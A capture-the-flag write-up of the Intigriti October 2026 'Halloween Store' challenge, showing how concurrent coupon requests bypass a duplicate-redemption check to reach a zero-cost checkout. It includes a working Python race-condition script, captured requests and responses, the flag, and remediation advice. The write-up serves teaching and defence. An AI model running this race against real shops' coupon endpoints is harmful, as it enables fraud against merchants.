
![Halloween Store — first look]<img width="1415" height="867" alt="Halloween" src="https://github.com/user-attachments/assets/94991254-a231-46b7-aaf4-f62b1c81d124" />

# Halloween Store — Intigriti October 2026 Challenge Write-up

**Author:** TOFAZZEL HOSSEN TOPU ([@xpl01t-z3r0](https://github.com/xpl01t-z3r0))  
**Challenge:** Intigriti October 2026 — Halloween Store  
**Category:** Race Condition / Business Logic  
**Classification:** CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization  
**Affected Endpoint:** `POST /api/cart/coupon`  
**Flag:** `INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}`

> **Scope:** All requests described here were made against the authorized Intigriti CTF challenge. This write-up documents the observed results, not assumptions about the application's internal source code.

---

## First Look

Opening the [Halloween Store challenge](https://challenge-1026.challenges.intigriti.io/challenge), I found a polished October-themed candy storefront. Three things immediately stood out:

- The account had **€66.00 in store credit**.
- The banner advertised **`NIGHT20`**, a 20% discount on *The Midnight Collection*.
- The target collection cost **€666.00** — far more than the available credit.

The obvious goal was to reduce the order enough to check out. The interesting question was whether the promotional logic could be made to accept more discounts than intended.

## Mapping the Shopping Cart

I added **The Midnight Collection** (`midnight-vault`) to the cart and inspected the JSON responses.

```http
GET /api/cart HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
```

**Initial cart (relevant fields):**

```json
{
  "itemCount": 1,
  "subtotal": 66600,
  "discount": 0,
  "total": 66600,
  "credit": 6600,
  "canCheckout": false,
  "promotions": []
}
```

Prices were represented in **cents**: `66600` meant **€666.00**, and `6600` meant **€66.00** in store credit.

A normal checkout attempt failed because the credit did not cover the order:

```http
HTTP/2 402 Payment Required
```

```json
{
  "ok": false,
  "error": "insufficient_credit",
  "message": "Your store credit does not cover this order."
}
```

## Finding the Coupons

The homepage publicly revealed `NIGHT20` (20%). Subscribing to the October newsletter unlocked another promotional code: **`NEWS30` (30%)**.

Coupon redemption was handled by:

```http
POST /api/cart/coupon HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
Content-Type: application/json

{"code":"NIGHT20"}
```

The second code used the same endpoint:

```json
{"code":"NEWS30"}
```

Applying each coupon once was not enough: the two percentage discounts totaled **50%**, leaving **€333.00** to pay. That still exceeded the available credit.

I then tested whether the application would accept the same code twice.

```http
HTTP/2 409 Conflict
Content-Type: application/json
```

```json
{
  "ok": false,
  "error": "coupon_already_applied",
  "message": "Coupon already applied."
}
```

**Sequential replay was blocked.** At first glance, duplicate-coupon validation appeared to work.

## The Turning Point: A Race Condition

The `409` response showed that a duplicate check existed, but it did not prove that the check and the state update happened **atomically**.

My hypothesis was straightforward: if several redemption requests reached the backend together, multiple requests might pass the eligibility check before the shared cart's promotional state was updated.

Instead of submitting one request at a time, I prepared **13 concurrent requests in the same session**:

| Coupon | Requests prepared | Discount per application |
|---|---:|---:|
| `NIGHT20` | 5 | 20% |
| `NEWS30` | 8 | 30% |
| **Total** | **13** | — |

I used `asyncio` and `httpx` with HTTP/2 enabled. An `asyncio.Event()` acted as a synchronization gate so the tasks would wait until they were all scheduled before sending requests.

This is **concurrent-request testing**, not a claim of a guaranteed single-packet attack. Results can vary depending on server scheduling.

## The Python Proof of Concept

Install the HTTP/2 dependencies:

```bash
python3 -m pip install "httpx[http2]"
```

**Save as `mixed_coupon_race.py`:**

```python
#!/usr/bin/env python3
"""Intigriti October 2026 challenge — coupon redemption race PoC.
For use only within the authorized CTF challenge environment.
"""
import asyncio
import getpass
import json
import random

import httpx

BASE_URL = "https://challenge-1026.challenges.intigriti.io"
SESSION = getpass.getpass("Challenge session cookie value: ").strip()
COUPONS = ["NIGHT20"] * 5 + ["NEWS30"] * 8
random.shuffle(COUPONS)


async def get_cart(client: httpx.AsyncClient) -> dict:
    response = await client.get("/api/cart")
    response.raise_for_status()
    result = response.json()
    if not result.get("ok"):
        raise RuntimeError(f"Cart request failed: {result}")
    return result["cart"]


async def apply_coupon(client, gate, index, code):
    await gate.wait()
    try:
        response = await client.post("/api/cart/coupon", json={"code": code})
        print(f"[{index:02d}] {code:7} -> HTTP {response.status_code}")
        return response.status_code
    except httpx.RequestError as error:
        print(f"[{index:02d}] {code:7} -> ERROR: {error}")
        return None


async def main():
    if not SESSION:
        raise SystemExit("A valid session cookie is required.")

    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    async with httpx.AsyncClient(
        base_url=BASE_URL,
        cookies={"session": SESSION},
        headers={
            "Accept": "application/json",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/cart",
        },
        http2=True,
        limits=limits,
        timeout=30.0,
    ) as client:
        initial = await get_cart(client)
        if not any(item.get("id") == "midnight-vault" for item in initial.get("items", [])):
            raise SystemExit("Add The Midnight Collection to the cart first.")
        if initial.get("promotions"):
            raise SystemExit("Use a fresh cart without applied coupons.")

        print("Initial total (EUR):", initial["total"] / 100)
        gate = asyncio.Event()
        tasks = [
            asyncio.create_task(apply_coupon(client, gate, i + 1, code))
            for i, code in enumerate(COUPONS)
        ]
        await asyncio.sleep(0.1)
        gate.set()
        statuses = await asyncio.gather(*tasks)

        print("\nRequests:", len(statuses))
        print("HTTP 200:", statuses.count(200))
        print("HTTP 409:", statuses.count(409))
        cart = await get_cart(client)
        print("\nFinal cart:")
        print(json.dumps({
            "subtotal": cart["subtotal"],
            "discount": cart["discount"],
            "total": cart["total"],
            "credit": cart["credit"],
            "canCheckout": cart["canCheckout"],
            "promotions": cart["promotions"],
        }, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
```

Run it with a valid challenge session (with the product in the cart, newsletter code unlocked, and no coupons already applied):

```bash
python3 mixed_coupon_race.py
```

The cookie is read interactively rather than hard-coded or published in the write-up.

## The Race Worked

One successful run produced the following outcomes:

| Request | Coupon | Response |
|---:|---|---|
| 01 | `NEWS30` | `200 OK` |
| 02 | `NIGHT20` | `200 OK` |
| 03 | `NEWS30` | `200 OK` |
| 04 | `NIGHT20` | `200 OK` |
| 05 | `NEWS30` | `200 OK` |
| 06 | `NIGHT20` | `200 OK` |
| 07 | `NEWS30` | `200 OK` |
| 08 | `NIGHT20` | `200 OK` |
| 09 | `NEWS30` | `409 Conflict` |
| 10 | `NEWS30` | `200 OK` |
| 11 | `NEWS30` | `409 Conflict` |
| 12 | `NIGHT20` | `409 Conflict` |
| 13 | `NEWS30` | `409 Conflict` |

**Final count: 9 accepted, 4 rejected.** The exact interleaving was timing-dependent, but the server's final cart response confirmed that duplicate redemptions had been persisted.

## Checking the Server-Side Cart

After the requests finished, I fetched `/api/cart` again.

```json
{
  "itemCount": 1,
  "subtotal": 66600,
  "discount": 66600,
  "total": 0,
  "credit": 6600,
  "canCheckout": true,
  "promotions": [
    {
      "code": "NEWS30",
      "percent": 30,
      "amount": 99900,
      "count": 5
    },
    {
      "code": "NIGHT20",
      "percent": 20,
      "amount": 53280,
      "count": 4
    }
  ]
}
```

That response was the decisive piece of evidence:

- `NEWS30` had been applied **five times** → `5 × 30% = 150%`.
- `NIGHT20` had been applied **four times** → `4 × 20% = 80%`.
- The combined **nominal discount was 230%**.
- The application capped the **effective** discount at the €666.00 subtotal.
- **`total` became `0`**, and **`canCheckout` became `true`**.

This was no longer just a frontend display issue. The server returned a modified cart with accumulated coupon counts and a zero payable amount.

## Getting the Flag — Zero-Cost Checkout

I proceeded to the checkout endpoint with the same session:

```http
POST /api/checkout HTTP/2
Host: challenge-1026.challenges.intigriti.io
Cookie: session=<REDACTED>
Content-Type: application/json

{}
```

Before the race, checkout had returned `402 Payment Required`. With the manipulated cart, **checkout completed successfully**. I received an order confirmation and retrieved the challenge flag:

```text
INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}
```

**Challenge solved.** The result demonstrated successful zero-cost order completion, not merely zero-cost checkout eligibility.

## The Full Attack Chain

```text
Halloween Store homepage
        |
        v
Discover NIGHT20 (20%) and unlock NEWS30 (30%)
        |
        v
Add The Midnight Collection (€666.00)
        |
        v
Initial checkout fails: HTTP 402 (only €66.00 credit)
        |
        v
Sequential duplicate coupon test: HTTP 409
        |
        v
Suspect a check-then-update race condition
        |
        v
Send 13 concurrent POST /api/cart/coupon requests
        |
        v
9 accepted: NEWS30 x5 + NIGHT20 x4
        |
        v
Nominal 230% discount; payable amount capped at €0.00
        |
        v
GET /api/cart -> total: 0, canCheckout: true
        |
        v
POST /api/checkout -> order confirmed
        |
        v
INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}
```

## Dead Ends and Lessons Learned

**Trying a normal checkout first:** With €666.00 due and €66.00 credit, checkout failed with HTTP `402`. This confirmed that the initial financial restriction was enforced.

**Applying codes sequentially:** Both coupons together left €333.00 to pay. Reusing either code normally returned HTTP `409`. Coupon stacking by itself was not enough.

**Treating a `409` as proof of safety:** A duplicate check can work for sequential requests while still failing when several requests race against the same state.

**Assuming every race run will be identical:** Concurrent scheduling is nondeterministic. The reliable evidence was the **server-side coupon counts and final cart state**, not merely how close together requests appeared to be sent.

## Why It Worked (Root Cause)

The observed behavior is consistent with a **Time-of-Check to Time-of-Use (TOCTOU)** weakness: coupon eligibility was apparently checked separately from the update that marked the code as redeemed.

An illustrative *unsafe* flow might look like this:

```python
# Conceptual pseudocode — not recovered application source
if not coupon_already_applied(cart_id, coupon_code):
    add_coupon_to_cart(cart_id, coupon_code)
```

If multiple workers evaluate the first condition before any of them persist the update, the same coupon can be accepted more than once.

**Important:** The actual database design, transaction boundaries, and locking strategy were not visible during the test. This pseudocode illustrates the suspected failure mode; it is not a claim about the application's source code.

## How to Fix It

The core fix is to make **coupon validation and redemption one atomic operation**.

1. **Use transactions and concurrency controls.** Apply row-level locks, optimistic concurrency checks, or atomic conditional updates appropriate to the storage system.
2. **Enforce redemption limits at the persistence layer.** For a one-use-per-cart rule, a unique `(cart_id, coupon_id)` constraint can prevent duplicate records.
3. **Revalidate discounts at checkout.** Calculate the final amount from authorized coupons before committing an order, within an appropriately protected transaction.
4. **Do not rely on price flooring.** Capping totals at zero prevents negative totals, but it does not prevent an invalid coupon state from authorizing a free order.
5. **Add concurrency regression tests.** Parallel duplicate redemptions should never increase a coupon's use count beyond its limit.

## Payload / Endpoint Summary

| Purpose | Endpoint | Method / Data | Observed result |
|---|---|---|---|
| Inspect cart | `/api/cart` | `GET` | Initial total €666.00 |
| Apply first coupon | `/api/cart/coupon` | `POST {"code":"NIGHT20"}` | 20% coupon |
| Apply second coupon | `/api/cart/coupon` | `POST {"code":"NEWS30"}` | 30% coupon |
| Test duplicate sequentially | `/api/cart/coupon` | Repeat a used code | `409 Conflict` |
| Trigger race | `/api/cart/coupon` | 13 concurrent coupon POSTs | 9 accepted |
| Validate cart | `/api/cart` | `GET` | `total: 0`, `canCheckout: true` |
| Complete challenge | `/api/checkout` | `POST {}` | Confirmed order and flag |

## Final Thoughts

The interesting part of this challenge was not finding a secret coupon or modifying the client-side price. The server had a real duplicate-redemption check, and it responded correctly to ordinary sequential misuse.

The weakness only appeared when **multiple requests competed to update the same cart**. Nine accepted redemptions were enough to turn a €666.00 order into a confirmed €0.00 checkout.

It's a good reminder that **business-logic validation must remain correct under concurrency**. An endpoint can behave safely request-by-request and still fail as a system.

**Flag:** `INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}`


<img width="519" height="608" alt="POC" src="https://github.com/user-attachments/assets/255caefd-2d31-4003-94a1-cd1224d02473" />



---

*Research and write-up: [TOFAZZEL HOSSEN TOPU / xpl01t-z3r0](https://github.com/xpl01t-z3r0) · Intigriti October 2026 CTF challenge.*
